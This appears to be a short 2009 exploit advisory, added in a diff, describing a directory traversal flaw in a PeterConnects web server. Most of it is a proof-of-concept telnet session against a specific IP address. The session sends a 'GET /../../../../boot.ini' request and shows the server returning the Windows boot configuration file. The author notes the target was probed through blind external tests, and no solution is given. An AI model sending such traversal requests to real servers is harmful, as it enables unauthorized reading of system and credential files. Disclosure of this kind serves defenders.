@@ -1,0 +1,46 @@
+- PeterConnects Web Server Traversal Arbitrary File Access
+
+- Description
+
+PeterConnects products use a web server that is vulnerable to classic
+directory traversal (hello 1987) that allows for arbitrary file
+access.
+
+- Product
+
+PeterConnects, Unknown Product, Unknown Version
+
+(blind external tests not so good for full disclosure)
+
+http://www.peter-connects.com/
+
+- PoC
+
+$ telnet 205.206.231.15 80
+Trying 205.206.231.15...
+Connected to 205.206.231.15.
+Escape character is '^]'.
+GET /../../../../boot.ini HTTP/1.0
+
+HTTP/1.0 200 OK
+Content-Type: application/octet-stream
+Content-Length: 303
+
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Windows Server 2003,
+Enterprise" /noexecute=optout /fastdetect
+multi(0)disk(0)rdisk(0)partition(4)\WINDOWS="Microsoft Windows XP
+Professional" /fastdetect
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+[truncated]
+
+- Solution
+
+None
+
+# milw0rm.com [2009-04-08]
